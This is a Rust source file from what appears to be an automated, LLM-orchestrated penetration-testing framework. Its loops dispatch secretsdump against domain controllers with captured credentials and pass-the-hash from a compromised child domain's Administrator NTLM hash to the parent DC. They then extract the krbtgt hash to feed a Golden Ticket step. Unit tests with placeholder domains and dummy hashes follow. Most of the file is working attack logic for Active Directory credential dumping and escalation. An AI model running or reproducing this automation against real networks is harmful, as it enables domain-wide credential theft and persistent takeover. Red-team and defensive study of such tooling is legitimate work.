//! auto_local_admin_secretsdump -- secretsdump with admin creds.

use std::sync::Arc;
use std::time::Duration;

use ares_llm::ToolCall;
use serde_json::{json, Value};
use tokio::sync::watch;
use tracing::{info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Check if a DC domain is a valid secretsdump target for a given credential domain.
/// Allows same domain, child domain, or parent domain.
fn is_valid_secretsdump_target(dc_domain: &str, cred_domain: &str) -> bool {
    let d = dc_domain.to_lowercase();
    let c = cred_domain.to_lowercase();
    d == c || d.ends_with(&format!(".{c}")) || c.ends_with(&format!(".{d}"))
}

/// Check if a child domain is a child of a parent domain for PTH escalation.
fn is_child_of(child: &str, parent: &str) -> bool {
    let c = child.to_lowercase();
    let p = parent.to_lowercase();
    c != p && c.ends_with(&format!(".{p}"))
}

/// Build secretsdump dedup key.
fn secretsdump_dedup_key(ip: &str, domain: &str, username: &str) -> String {
    format!(
        "{}:{}:{}",
        ip,
        domain.to_lowercase(),
        username.to_lowercase()
    )
}

/// Build PTH secretsdump dedup key.
fn pth_secretsdump_dedup_key(dc_ip: &str, parent_domain: &str) -> String {
    format!("{}:{}:pth_admin", dc_ip, parent_domain)
}

/// Build krbtgt-extraction dedup key. Distinct from the generic PTH key
/// (which is for full domain dumps) so a prior full-dump failure doesn't
/// block the narrower `-just-dc-user krbtgt` attempt against the same DC.
fn krbtgt_extraction_dedup_key(dc_ip: &str, domain: &str) -> String {
    format!(
        "{}:{}:krbtgt_extraction_direct_v2",
        dc_ip,
        domain.to_lowercase()
    )
}

/// Find a usable Administrator NTLM hash for a domain.
fn select_administrator_hash(state: &StateInner, domain: &str) -> Option<String> {
    let dom = domain.to_lowercase();
    state
        .hashes
        .iter()
        .find(|h| {
            h.username.eq_ignore_ascii_case("administrator")
                && h.hash_type.eq_ignore_ascii_case("NTLM")
                && h.domain.to_lowercase() == dom
        })
        .map(|h| h.hash_value.clone())
}

/// True when we already have a krbtgt hash for the domain (so the GT step is
/// unblocked and we don't need to re-run DCSync against the DC).
/// A secretsdump work item: `(dedup_key, dc_ip, credential)`.
pub(crate) type SecretsdumpWorkItem = (String, String, ares_core::models::Credential);

/// A PTH secretsdump work item:
/// `(dedup_key, parent_dc_ip, child_domain, admin_ntlm_hash, parent_domain)`.
pub(crate) type PthSecretsdumpWorkItem = (String, String, String, String, String);

/// Select credential-based secretsdump work items for this tick.
///
/// Walks `state.credentials × state.all_domains_with_dcs()` and keeps only
/// cred/DC pairs where the DC's domain is the same forest as the cred (per
/// `is_valid_secretsdump_target`) and the dedup key is unprocessed. Skips
/// quarantined principals and non-admin delegation accounts.
pub(crate) fn select_local_admin_secretsdump_work(state: &StateInner) -> Vec<SecretsdumpWorkItem> {
    let mut items = Vec::new();
    for cred in state
        .credentials
        .iter()
        .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
        .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
        .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
    {
        for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
            if !is_valid_secretsdump_target(dc_domain, &cred.domain) {
                continue;
            }
            let dedup = secretsdump_dedup_key(dc_ip, &cred.domain, &cred.username);
            if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                items.push((dedup, dc_ip.clone(), cred.clone()));
            }
        }
    }
    items
}

/// Select pass-the-hash secretsdump work items targeting parent-domain DCs
/// from dominated-child Administrator NTLM hashes.
///
/// For each `dominated_domains` entry, walks `all_domains_with_dcs()` looking
/// for the lowercased child's parent (`dom.ends_with(".{parent}")`); when one
/// is found AND state has an Administrator NTLM hash for the child, emits a
/// PTH work item against the parent DC. Skips already-processed dedup keys.
pub(crate) fn select_pth_secretsdump_work(state: &StateInner) -> Vec<PthSecretsdumpWorkItem> {
    let mut items = Vec::new();
    for dominated in &state.dominated_domains {
        let dom = dominated.to_lowercase();
        for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
            if !is_child_of(&dom, dc_domain) {
                continue;
            }
            let Some(hash) = state.hashes.iter().find(|h| {
                h.username.to_lowercase() == "administrator"
                    && h.hash_type.to_uppercase() == "NTLM"
                    && h.domain.to_lowercase() == dom
            }) else {
                continue;
            };
            let parent = dc_domain.to_lowercase();
            let dedup = pth_secretsdump_dedup_key(dc_ip, &parent);
            if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                items.push((
                    dedup,
                    dc_ip.clone(),
                    hash.domain.clone(),
                    hash.hash_value.clone(),
                    parent,
                ));
            }
        }
    }
    items
}

fn has_krbtgt_hash(state: &StateInner, domain: &str) -> bool {
    let dom = domain.to_lowercase();
    state.hashes.iter().any(|h| {
        h.username.eq_ignore_ascii_case("krbtgt")
            && h.hash_type.eq_ignore_ascii_case("NTLM")
            && h.domain.to_lowercase() == dom
    })
}

fn build_krbtgt_extraction_args(dc_ip: &str, domain: &str, hash_value: &str) -> Value {
    json!({
        "target": dc_ip,
        "target_ip": dc_ip,
        "dc_ip": dc_ip,
        "username": "Administrator",
        "domain": domain,
        "target_domain": domain,
        "hash": hash_value,
        "just_dc_user": "krbtgt",
        "timeout_minutes": 3,
    })
}

fn discoveries_include_krbtgt(discoveries: Option<&Value>, domain: &str) -> bool {
    let dom = domain.to_lowercase();
    discoveries
        .and_then(|d| d.get("hashes"))
        .and_then(Value::as_array)
        .is_some_and(|hashes| {
            hashes.iter().any(|h| {
                let username_matches = h
                    .get("username")
                    .and_then(Value::as_str)
                    .is_some_and(|u| u.eq_ignore_ascii_case("krbtgt"));
                let domain_matches = h
                    .get("domain")
                    .and_then(Value::as_str)
                    .is_some_and(|d| d.eq_ignore_ascii_case(&dom));
                let hash_type_matches = h
                    .get("hash_type")
                    .and_then(Value::as_str)
                    .is_none_or(|t| t.eq_ignore_ascii_case("ntlm"));
                username_matches && domain_matches && hash_type_matches
            })
        })
}

async fn dispatch_krbtgt_extraction_direct(
    dispatcher: &Dispatcher,
    dc_ip: &str,
    domain: &str,
    hash_value: &str,
) -> bool {
    let task_id = format!("krbtgt_extract_{}", uuid::Uuid::new_v4().simple());
    let call = ToolCall {
        id: format!("{}_call", task_id),
        name: "secretsdump".to_string(),
        arguments: build_krbtgt_extraction_args(dc_ip, domain, hash_value),
    };

    info!(
        task_id = %task_id,
        dc = %dc_ip,
        domain = %domain,
        "krbtgt extraction dispatched (direct tool, just-dc-user krbtgt)"
    );

    match dispatcher
        .llm_runner
        .tool_dispatcher()
        .dispatch_tool("credential_access", &task_id, &call)
        .await
    {
        Ok(result) => {
            let found = discoveries_include_krbtgt(result.discoveries.as_ref(), domain);
            if found {
                info!(
                    task_id = %task_id,
                    dc = %dc_ip,
                    domain = %domain,
                    "krbtgt extraction completed with parsed krbtgt hash"
                );
            } else {
                warn!(
                    task_id = %task_id,
                    dc = %dc_ip,
                    domain = %domain,
                    error = ?result.error,
                    output_len = result.output.len(),
                    "krbtgt extraction completed without parsed krbtgt hash; will retry"
                );
            }
            found
        }
        Err(e) => {
            warn!(
                err = %e,
                dc = %dc_ip,
                domain = %domain,
                "Failed to dispatch direct krbtgt extraction"
            );
            false
        }
    }
}

/// Dispatches secretsdump when admin credentials are detected.
/// Interval: 30s.
pub async fn auto_local_admin_secretsdump(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Strategy gate: skip if secretsdump is excluded.
        if !dispatcher.is_technique_allowed("secretsdump") {
            continue;
        }

        let work: Vec<SecretsdumpWorkItem> = {
            let state = dispatcher.state.read().await;
            select_local_admin_secretsdump_work(&state)
        };

        for (dedup_key, dc_ip, cred) in work.into_iter().take(3) {
            let priority = if cred.is_admin { 2 } else { 5 };
            match dispatcher
                .request_secretsdump(&dc_ip, &cred, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, dc = %dc_ip, user = %cred.username, "Admin secretsdump dispatched");
                    {
                        let mut state = dispatcher.state.write().await;
                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                        state.mark_credential_capture_in_flight(&cred.domain);
                    }
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch secretsdump"),
            }
        }

        // Hash-based secretsdump: when we dominate a child domain, use the
        // Administrator NTLM hash to PTH against parent domain DCs.
        // This covers child-to-parent escalation (e.g. child.contoso.local
        // → contoso.local) where password-based creds won't have admin
        // rights on the parent DC.
        // Strategy gate: skip dc_secretsdump if excluded.
        if !dispatcher.is_technique_allowed("dc_secretsdump") {
            continue;
        }

        let hash_work: Vec<PthSecretsdumpWorkItem> = {
            let state = dispatcher.state.read().await;
            select_pth_secretsdump_work(&state)
        };

        for (dedup_key, dc_ip, hash_domain, hash_value, parent_domain) in
            hash_work.into_iter().take(2)
        {
            let priority = dispatcher.effective_priority("dc_secretsdump");
            match dispatcher
                .request_secretsdump_hash(
                    &dc_ip,
                    "Administrator",
                    &hash_domain,
                    &hash_value,
                    priority,
                    None,
                )
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        dc = %dc_ip,
                        hash_domain = %hash_domain,
                        "PTH secretsdump dispatched against parent DC"
                    );
                    {
                        let mut state = dispatcher.state.write().await;
                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                        state.mark_credential_capture_in_flight(&parent_domain);
                    }
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch PTH secretsdump"),
            }
        }
    }
}

/// Dispatches a narrowed `secretsdump -just-dc-user krbtgt` whenever we hold
/// an Administrator NTLM hash for a domain but haven't yet captured that
/// domain's krbtgt hash. This closes the gap between "DA captured" and
/// "Golden Ticket forged": `auto_local_admin_secretsdump` only fires the PtH
/// path on child→parent escalation (gated on `dominated_domains`), and the
/// generic credential_access prompt lets the LLM omit `-just-dc-user` or
/// mis-shape the hash argument. Dispatch the tool directly and only mark the
/// dedup after parser output confirms the krbtgt hash. Once krbtgt lands,
/// `auto_golden_ticket` takes over.
pub async fn auto_krbtgt_extraction(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("dc_secretsdump") {
            continue;
        }

        let work: Vec<(String, String, String, String)> = {
            let state = dispatcher.state.read().await;
            let mut items = Vec::new();
            for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
                let dom = dc_domain.to_lowercase();
                if has_krbtgt_hash(&state, &dom) {
                    continue;
                }
                let Some(hash) = select_administrator_hash(&state, &dom) else {
                    continue;
                };
                let dedup = krbtgt_extraction_dedup_key(dc_ip, &dom);
                if state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                    continue;
                }
                items.push((dedup, dc_ip.clone(), dom, hash));
            }
            items
        };

        for (dedup_key, dc_ip, domain, hash_value) in work.into_iter().take(2) {
            {
                let mut state = dispatcher.state.write().await;
                state.mark_credential_capture_in_flight(&domain);
            }

            if dispatch_krbtgt_extraction_direct(&dispatcher, &dc_ip, &domain, &hash_value).await {
                {
                    let mut state = dispatcher.state.write().await;
                    state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                    state.mark_credential_capture_in_flight(&domain);
                }
                let _ = dispatcher
                    .state
                    .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                    .await;
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn valid_secretsdump_target_same_domain() {
        assert!(is_valid_secretsdump_target(
            "contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_case_insensitive() {
        assert!(is_valid_secretsdump_target(
            "CONTOSO.LOCAL",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_dc_is_child() {
        assert!(is_valid_secretsdump_target(
            "child.contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_dc_is_parent() {
        assert!(is_valid_secretsdump_target(
            "contoso.local",
            "child.contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_unrelated_rejected() {
        assert!(!is_valid_secretsdump_target(
            "fabrikam.local",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_empty_strings() {
        assert!(is_valid_secretsdump_target("", ""));
    }

    #[test]
    fn valid_secretsdump_target_one_empty() {
        assert!(!is_valid_secretsdump_target("contoso.local", ""));
    }

    #[test]
    fn is_child_of_basic() {
        assert!(is_child_of("child.contoso.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_case_insensitive() {
        assert!(is_child_of("CHILD.CONTOSO.LOCAL", "contoso.local"));
    }

    #[test]
    fn is_child_of_deeply_nested() {
        assert!(is_child_of("deep.child.contoso.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_same_domain_rejected() {
        assert!(!is_child_of("contoso.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_parent_not_child() {
        assert!(!is_child_of("contoso.local", "child.contoso.local"));
    }

    #[test]
    fn is_child_of_unrelated_rejected() {
        assert!(!is_child_of("fabrikam.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_empty_strings() {
        assert!(!is_child_of("", ""));
    }

    #[test]
    fn secretsdump_dedup_key_basic() {
        assert_eq!(
            secretsdump_dedup_key("192.168.58.1", "contoso.local", "Administrator"),
            "192.168.58.1:contoso.local:administrator"
        );
    }

    #[test]
    fn secretsdump_dedup_key_lowercases() {
        assert_eq!(
            secretsdump_dedup_key("192.168.58.1", "CONTOSO.LOCAL", "ADMIN"),
            "192.168.58.1:contoso.local:admin"
        );
    }

    #[test]
    fn secretsdump_dedup_key_empty_fields() {
        assert_eq!(secretsdump_dedup_key("", "", ""), "::");
    }

    #[test]
    fn pth_secretsdump_dedup_key_basic() {
        assert_eq!(
            pth_secretsdump_dedup_key("192.168.58.1", "contoso.local"),
            "192.168.58.1:contoso.local:pth_admin"
        );
    }

    #[test]
    fn pth_secretsdump_dedup_key_preserves_ip() {
        let key = pth_secretsdump_dedup_key("192.168.58.100", "contoso.local");
        assert!(key.starts_with("192.168.58.100:"));
    }

    #[test]
    fn pth_secretsdump_dedup_key_empty_fields() {
        assert_eq!(pth_secretsdump_dedup_key("", ""), "::pth_admin");
    }

    #[test]
    fn krbtgt_extraction_dedup_key_is_direct_path() {
        assert_eq!(
            krbtgt_extraction_dedup_key("192.168.58.20", "CONTOSO.LOCAL"),
            "192.168.58.20:contoso.local:krbtgt_extraction_direct_v2"
        );
    }

    #[test]
    fn build_krbtgt_extraction_args_uses_direct_secretsdump_shape() {
        let args = build_krbtgt_extraction_args(
            "192.168.58.20",
            "contoso.local",
            "aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef",
        );
        assert_eq!(args["target"], "192.168.58.20");
        assert_eq!(args["target_ip"], "192.168.58.20");
        assert_eq!(args["dc_ip"], "192.168.58.20");
        assert_eq!(args["username"], "Administrator");
        assert_eq!(args["domain"], "contoso.local");
        assert_eq!(args["target_domain"], "contoso.local");
        assert_eq!(
            args["hash"],
            "aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef"
        );
        assert_eq!(args["just_dc_user"], "krbtgt");
        assert_eq!(args["timeout_minutes"], 3);
    }

    #[test]
    fn discoveries_include_krbtgt_accepts_matching_ntlm_hash() {
        let discoveries = json!({
            "hashes": [{
                "username": "krbtgt",
                "domain": "contoso.local",
                "hash_type": "ntlm",
                "hash_value": "lm:nt"
            }]
        });
        assert!(discoveries_include_krbtgt(
            Some(&discoveries),
            "CONTOSO.LOCAL"
        ));
    }

    #[test]
    fn discoveries_include_krbtgt_rejects_wrong_domain() {
        let discoveries = json!({
            "hashes": [{
                "username": "krbtgt",
                "domain": "fabrikam.local",
                "hash_type": "ntlm",
                "hash_value": "lm:nt"
            }]
        });
        assert!(!discoveries_include_krbtgt(
            Some(&discoveries),
            "contoso.local"
        ));
    }

    // ── tests for select_local_admin_secretsdump_work / select_pth_secretsdump_work ──

    fn make_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: format!("c-{user}-{domain}"),
            username: user.to_string(),
            password: password.to_string(),
            domain: domain.to_string(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_admin_ntlm_hash(domain: &str, value: &str) -> ares_core::models::Hash {
        ares_core::models::Hash {
            id: format!("h-admin-{domain}"),
            username: "Administrator".into(),
            hash_value: value.into(),
            hash_type: "NTLM".into(),
            domain: domain.into(),
            cracked_password: None,
            source: String::new(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        }
    }

    // --- select_local_admin_secretsdump_work ----------------------------

    #[test]
    fn select_local_admin_skips_empty_password() {
        let mut s = StateInner::new("op".into());
        s.credentials.push(make_cred("alice", "", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_local_admin_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_local_admin_skips_empty_domain() {
        let mut s = StateInner::new("op".into());
        s.credentials.push(make_cred("alice", "Pw", ""));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_local_admin_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_local_admin_pairs_cred_with_same_domain_dc() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_local_admin_secretsdump_work(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].1, "192.168.58.10");
        assert_eq!(work[0].2.username, "alice");
    }

    #[test]
    fn select_local_admin_pairs_parent_cred_with_child_dc() {
        // Parent-domain credentials are valid against child DCs
        // (`is_valid_secretsdump_target` rules child as same-forest).
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("child.contoso.local".into(), "192.168.58.11".into());
        let work = select_local_admin_secretsdump_work(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].1, "192.168.58.11");
    }

    #[test]
    fn select_local_admin_skips_cross_forest_dc() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        assert!(select_local_admin_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_local_admin_skips_quarantined_principal() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.quarantine_principal("alice", "contoso.local");
        assert!(select_local_admin_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_local_admin_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(
            DEDUP_SECRETSDUMP,
            secretsdump_dedup_key("192.168.58.10", "contoso.local", "alice"),
        );
        assert!(select_local_admin_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_local_admin_emits_one_item_per_cred_dc_pair() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw1", "contoso.local"));
        s.credentials.push(make_cred("bob", "Pw2", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.domain_controllers
            .insert("child.contoso.local".into(), "192.168.58.11".into());
        let work = select_local_admin_secretsdump_work(&s);
        // 2 creds × 2 DCs = 4 items.
        assert_eq!(work.len(), 4);
    }

    // --- select_pth_secretsdump_work ------------------------------------

    #[test]
    fn select_pth_returns_empty_when_no_dominated_child() {
        let mut s = StateInner::new("op".into());
        s.hashes
            .push(make_admin_ntlm_hash("child.contoso.local", "deadbeef"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        // No dominated_domains entry → no PTH work.
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_pth_emits_when_child_dominated_and_admin_hash_present() {
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        s.hashes
            .push(make_admin_ntlm_hash("child.contoso.local", "deadbeef"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_pth_secretsdump_work(&s);
        assert_eq!(work.len(), 1);
        // (dedup_key, parent_dc_ip, child_domain, ntlm_hash, parent_domain_lc)
        assert_eq!(work[0].1, "192.168.58.10");
        assert_eq!(work[0].2, "child.contoso.local");
        assert_eq!(work[0].3, "deadbeef");
        assert_eq!(work[0].4, "contoso.local");
    }

    #[test]
    fn select_pth_skips_when_no_matching_admin_hash() {
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        // No admin hash for child.contoso.local → skip.
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_pth_skips_non_ntlm_hash() {
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        let mut h = make_admin_ntlm_hash("child.contoso.local", "deadbeef");
        h.hash_type = "AES256".into();
        s.hashes.push(h);
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_pth_skips_non_administrator_username() {
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        let mut h = make_admin_ntlm_hash("child.contoso.local", "deadbeef");
        h.username = "alice".into();
        s.hashes.push(h);
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_pth_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        s.hashes
            .push(make_admin_ntlm_hash("child.contoso.local", "deadbeef"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(
            DEDUP_SECRETSDUMP,
            pth_secretsdump_dedup_key("192.168.58.10", "contoso.local"),
        );
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_pth_skips_when_dc_is_not_parent_of_dominated_child() {
        // dominated = grandchild; DC list has unrelated forest → no work.
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        s.hashes
            .push(make_admin_ntlm_hash("child.contoso.local", "deadbeef"));
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }
}
